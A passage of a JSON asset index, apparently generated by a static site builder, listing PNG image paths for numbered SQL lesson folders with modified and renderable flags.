,"renderable":0},{"_id":"source/img/sql/Lesson-21/009.png","path":"img/sql/Lesson-21/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-21/010.png","path":"img/sql/Lesson-21/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/004.png","path":"img/sql/Lesson-22/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/005.png","path":"img/sql/Lesson-22/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/006.png","path":"img/sql/Lesson-22/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-22/007.png","path":"img/sql/Lesson-22/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/002.png","path":"img/sql/Lesson-23/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/010.png","path":"img/sql/Lesson-23/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-23/011.png","path":"img/sql/Lesson-23/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/002.png","path":"img/sql/Lesson-24/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/003.png","path":"img/sql/Lesson-24/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/004.png","path":"img/sql/Lesson-24/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-24/006.png","path":"img/sql/Lesson-24/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/008.png","path":"img/sql/Lesson-25/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/009.png","path":"img/sql/Lesson-25/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25/010.png","path":"img/sql/Lesson-25/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/005.png","path":"img/sql/Lesson-25a/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/006.png","path":"img/sql/Lesson-25a/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/007.png","path":"img/sql/Lesson-25a/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/008.png","path":"img/sql/Lesson-25a/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/009.png","path":"img/sql/Lesson-25a/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-25a/010.png","path":"img/sql/Lesson-25a/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/002.png","path":"img/sql/Lesson-26/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/007.png","path":"img/sql/Lesson-26/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/008.png","path":"img/sql/Lesson-26/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/008_1.png","path":"img/sql/Lesson-26/008_1.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/008_2.png","path":"img/sql/Lesson-26/008_2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/009.png","path":"img/sql/Lesson-26/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/008_3.png","path":"img/sql/Lesson-26/008_3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26/010.png","path":"img/sql/Lesson-26/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/008.png","path":"img/sql/Lesson-26a/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/009.png","path":"img/sql/Lesson-26a/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/010.png","path":"img/sql/Lesson-26a/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/011.png","path":"img/sql/Lesson-26a/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/012.png","path":"img/sql/Lesson-26a/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-26a/013.png","path":"img/sql/Lesson-26a/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27/005.png","path":"img/sql/Lesson-27/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27/006.png","path":"img/sql/Lesson-27/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27/007.png","path":"img/sql/Lesson-27/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27/008.png","path":"img/sql/Lesson-27/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27/009.png","path":"img/sql/Lesson-27/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27a/006.png","path":"img/sql/Lesson-27a/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27a/007.png","path":"img/sql/Lesson-27a/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27a/008.png","path":"img/sql/Lesson-27a/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-27a/009.png","path":"img/sql/Lesson-27a/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/008.png","path":"img/sql/Lesson-28/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/009.png","path":"img/sql/Lesson-28/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/010.png","path":"img/sql/Lesson-28/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/011.png","path":"img/sql/Lesson-28/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28/012.png","path":"img/sql/Lesson-28/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-28a/002.png","path":"img/sql/Lesson-28a/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-29/002.png","path":"img/sql/Lesson-29/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-29/010.png","path":"img/sql/Lesson-29/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-29/011.png","path":"img/sql/Lesson-29/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-29/012.png","path":"img/sql/Lesson-29/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/002.png","path":"img/sql/Lesson-30/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/010.png","path":"img/sql/Lesson-30/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/011.png","path":"img/sql/Lesson-30/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/012.png","path":"img/sql/Lesson-30/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/013.png","path":"img/sql/Lesson-30/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-30/014.png","path":"img/sql/Lesson-30/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/003.png","path":"img/sql/Lesson-31/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/005.png","path":"img/sql/Lesson-31/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/006.png","path":"img/sql/Lesson-31/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/007.png","path":"img/sql/Lesson-31/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/008.png","path":"img/sql/Lesson-31/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/009.png","path":"img/sql/Lesson-31/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/010.png","path":"img/sql/Lesson-31/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/011.png","path":"img/sql/Lesson-31/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-31/012.png","path":"img/sql/Lesson-31/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/002.png","path":"img/sql/Lesson-32/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/003.png","path":"img/sql/Lesson-32/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/004.png","path":"img/sql/Lesson-32/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/005.png","path":"img/sql/Lesson-32/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/010.png","path":"img/sql/Lesson-32/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/011.png","path":"img/sql/Lesson-32/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/012.png","path":"img/sql/Lesson-32/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/013.png","path":"img/sql/Lesson-32/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/014.png","path":"img/sql/Lesson-32/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/015.png","path":"img/sql/Lesson-32/015.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/016.png","path":"img/sql/Lesson-32/016.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-32/017.png","path":"img/sql/Lesson-32/017.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/002.png","path":"img/sql/Lesson-33/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/003.png","path":"img/sql/Lesson-33/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/005.png","path":"img/sql/Lesson-33/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/006.png","path":"img/sql/Lesson-33/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/007.png","path":"img/sql/Lesson-33/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-33/008.png","path":"img/sql/Lesson-33/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/004.png","path":"img/sql/Lesson-34/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/006.png","path":"img/sql/Lesson-34/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/007.png","path":"img/sql/Lesson-34/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/008.png","path":"img/sql/Lesson-34/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/009.png","path":"img/sql/Lesson-34/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/010.png","path":"img/sql/Lesson-34/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-34/011.png","path":"img/sql/Lesson-34/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/002.png","path":"img/sql/Lesson-35/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/011.png","path":"img/sql/Lesson-35/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/012.png","path":"img/sql/Lesson-35/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/013.png","path":"img/sql/Lesson-35/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-35/014.png","path":"img/sql/Lesson-35/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/002.png","path":"img/sql/Lesson-36/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/004.png","path":"img/sql/Lesson-36/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/005.png","path":"img/sql/Lesson-36/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/008.png","path":"img/sql/Lesson-36/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/009.png","path":"img/sql/Lesson-36/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-36/010.png","path":"img/sql/Lesson-36/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/002.png","path":"img/sql/Lesson-38/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/003.png","path":"img/sql/Lesson-38/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/004.png","path":"img/sql/Lesson-38/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/005.png","path":"img/sql/Lesson-38/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/006.png","path":"img/sql/Lesson-38/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/008.png","path":"img/sql/Lesson-38/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/010.png","path":"img/sql/Lesson-38/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/011.png","path":"img/sql/Lesson-38/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/014.png","path":"img/sql/Lesson-38/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/015.png","path":"img/sql/Lesson-38/015.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-38/016.png","path":"img/sql/Lesson-38/016.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/001.png","path":"img/sql/Lesson-39/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/002.png","path":"img/sql/Lesson-39/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/003.png","path":"img/sql/Lesson-39/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/004.png","path":"img/sql/Lesson-39/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/005.png","path":"img/sql/Lesson-39/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-39/006.png","path":"img/sql/Lesson-39/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-4/3.png","path":"img/sql/Lesson-4/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/002.png","path":"img/sql/Lesson-40/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/003.png","path":"img/sql/Lesson-40/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/004.png","path":"img/sql/Lesson-40/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/005.png","path":"img/sql/Lesson-40/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-40/006.png","path":"img/sql/Lesson-40/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/002.png","path":"img/sql/Lesson-41/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/003.png","path":"img/sql/Lesson-41/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/004.png","path":"img/sql/Lesson-41/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/005.png","path":"img/sql/Lesson-41/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-41/006.png","path":"img/sql/Lesson-41/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/001.png","path":"img/sql/Lesson-42/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/002.png","path":"img/sql/Lesson-42/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/003.png","path":"img/sql/Lesson-42/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/005.png","path":"img/sql/Lesson-42/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/007.png","path":"img/sql/Lesson-42/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/008.png","path":"img/sql/Lesson-42/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-42/011.png","path":"img/sql/Lesson-42/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/001.png","path":"img/sql/Lesson-43/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/011.png","path":"img/sql/Lesson-43/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/012.png","path":"img/sql/Lesson-43/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/013.png","path":"img/sql/Lesson-43/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-43/014.png","path":"img/sql/Lesson-43/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/001.png","path":"img/sql/Lesson-44/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/012.png","path":"img/sql/Lesson-44/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/013.png","path":"img/sql/Lesson-44/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/014.png","path":"img/sql/Lesson-44/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-44/015.png","path":"img/sql/Lesson-44/015.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/002.png","path":"img/sql/Lesson-45/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/004.png","path":"img/sql/Lesson-45/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/005.png","path":"img/sql/Lesson-45/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/007.png","path":"img/sql/Lesson-45/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-45/008.png","path":"img/sql/Lesson-45/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/002.png","path":"img/sql/Lesson-46/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/003.png","path":"img/sql/Lesson-46/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/005.png","path":"img/sql/Lesson-46/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/006.png","path":"img/sql/Lesson-46/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/007.png","path":"img/sql/Lesson-46/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/008.png","path":"img/sql/Lesson-46/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/009.png","path":"img/sql/Lesson-46/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/010.png","path":"img/sql/Lesson-46/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/011.png","path":"img/sql/Lesson-46/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/012.png","path":"img/sql/Lesson-46/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/013.png","path":"img/sql/Lesson-46/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-46/014.png","path":"img/sql/Lesson-46/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/001.png","path":"img/sql/Lesson-47/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/002.png","path":"img/sql/Lesson-47/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/003.png","path":"img/sql/Lesson-47/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/004.png","path":"img/sql/Lesson-47/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/005.png","path":"img/sql/Lesson-47/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/006.png","path":"img/sql/Lesson-47/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/007.png","path":"img/sql/Lesson-47/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-47/008.png","path":"img/sql/Lesson-47/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/001.png","path":"img/sql/Lesson-48/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/002.png","path":"img/sql/Lesson-48/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/003.png","path":"img/sql/Lesson-48/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/004.png","path":"img/sql/Lesson-48/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/005.png","path":"img/sql/Lesson-48/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/006.png","path":"img/sql/Lesson-48/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/007.png","path":"img/sql/Lesson-48/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/008.png","path":"img/sql/Lesson-48/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/009.png","path":"img/sql/Lesson-48/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/010.png","path":"img/sql/Lesson-48/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/011.png","path":"img/sql/Lesson-48/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/012.png","path":"img/sql/Lesson-48/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/013.png","path":"img/sql/Lesson-48/013.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/014.png","path":"img/sql/Lesson-48/014.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-48/015.png","path":"img/sql/Lesson-48/015.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-49/001.png","path":"img/sql/Lesson-49/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-49/003.png","path":"img/sql/Lesson-49/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-49/004.png","path":"img/sql/Lesson-49/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-49/005.png","path":"img/sql/Lesson-49/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-49/006.png","path":"img/sql/Lesson-49/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/001.png","path":"img/sql/Lesson-50/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/002.png","path":"img/sql/Lesson-50/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/003.png","path":"img/sql/Lesson-50/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/004.png","path":"img/sql/Lesson-50/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/006.png","path":"img/sql/Lesson-50/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/005.png","path":"img/sql/Lesson-50/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/007.png","path":"img/sql/Lesson-50/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/008.png","path":"img/sql/Lesson-50/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/010.png","path":"img/sql/Lesson-50/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/009.png","path":"img/sql/Lesson-50/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-50/011.png","path":"img/sql/Lesson-50/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/001.png","path":"img/sql/Lesson-51/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/002.png","path":"img/sql/Lesson-51/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/003.png","path":"img/sql/Lesson-51/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/005.png","path":"img/sql/Lesson-51/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/004.png","path":"img/sql/Lesson-51/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/006.png","path":"img/sql/Lesson-51/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/007.png","path":"img/sql/Lesson-51/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/008.png","path":"img/sql/Lesson-51/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-51/009.png","path":"img/sql/Lesson-51/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/001.png","path":"img/sql/Lesson-52/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/002.png","path":"img/sql/Lesson-52/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/003.png","path":"img/sql/Lesson-52/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/004.png","path":"img/sql/Lesson-52/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/005.png","path":"img/sql/Lesson-52/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/006.png","path":"img/sql/Lesson-52/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/007.png","path":"img/sql/Lesson-52/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/008.png","path":"img/sql/Lesson-52/008.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/009.png","path":"img/sql/Lesson-52/009.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/010.png","path":"img/sql/Lesson-52/010.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/011.png","path":"img/sql/Lesson-52/011.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-52/012.png","path":"img/sql/Lesson-52/012.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/001.png","path":"img/sql/Lesson-53/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/002.png","path":"img/sql/Lesson-53/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/003.png","path":"img/sql/Lesson-53/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/004.png","path":"img/sql/Lesson-53/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/005.png","path":"img/sql/Lesson-53/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/006.png","path":"img/sql/Lesson-53/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-53/007.png","path":"img/sql/Lesson-53/007.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-54/004.png","path":"img/sql/Lesson-54/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-54/006.png","path":"img/sql/Lesson-54/006.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-54/005.png","path":"img/sql/Lesson-54/005.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-59/001.png","path":"img/sql/Lesson-59/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-59/002.png","path":"img/sql/Lesson-59/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-59/003.png","path":"img/sql/Lesson-59/003.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-59/004.png","path":"img/sql/Lesson-59/004.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-61/001.png","path":"img/sql/Lesson-61/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-62/001.png","path":"img/sql/Lesson-62/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-62/002.png","path":"img/sql/Lesson-62/002.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-63/001.png","path":"img/sql/Lesson-63/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-64/001.png","path":"img/sql/Lesson-64/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-65/001.png","path":"img/sql/Lesson-65/001.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/11.png","path":"img/sql/Lesson-7/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/5.png","path":"img/sql/Lesson-7/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/7.png","path":"img/sql/Lesson-7/7.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/8.png","path":"img/sql/Lesson-7/8.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-7/9.png","path":"img/sql/Lesson-7/9.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/2.png","path":"img/sql/Lesson-8/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/21.png","path":"img/sql/Lesson-8/21.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-8/3.png","path":"img/sql/Lesson-8/3.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/10.png","path":"img/sql/Lesson-9/10.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/11.png","path":"img/sql/Lesson-9/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/2.png","path":"img/sql/Lesson-9/2.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/5.png","path":"img/sql/Lesson-9/5.png","modified":0,"renderable":0},{"_id":"source/img/sql/Lesson-9/6.png","path":"img/sql/Lesson-9/6.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/11.png","path":"img/sql/lesson-5/11.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/12.png","path":"img/sql/lesson-5/12.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson-5/4.png","path":"img/sql/lesson-5/4.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/12.png","path":"img/sql/lesson1/12.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/19.png","path":"img/sql/lesson1/19.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/20.png","path":"img/sql/lesson1/20.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/21.png","path":"img/sql/lesson1/21.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/22.png","path":"img/sql/lesson1/22.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/23.png","path":"img/sql/lesson1/23.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/24.png","path":"img/sql/lesson1/24.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/26.png","path":"img/sql/lesson1/26.png","modified":0,"renderable":0},{"_id":"source/img/sql/lesson1/5.png","path"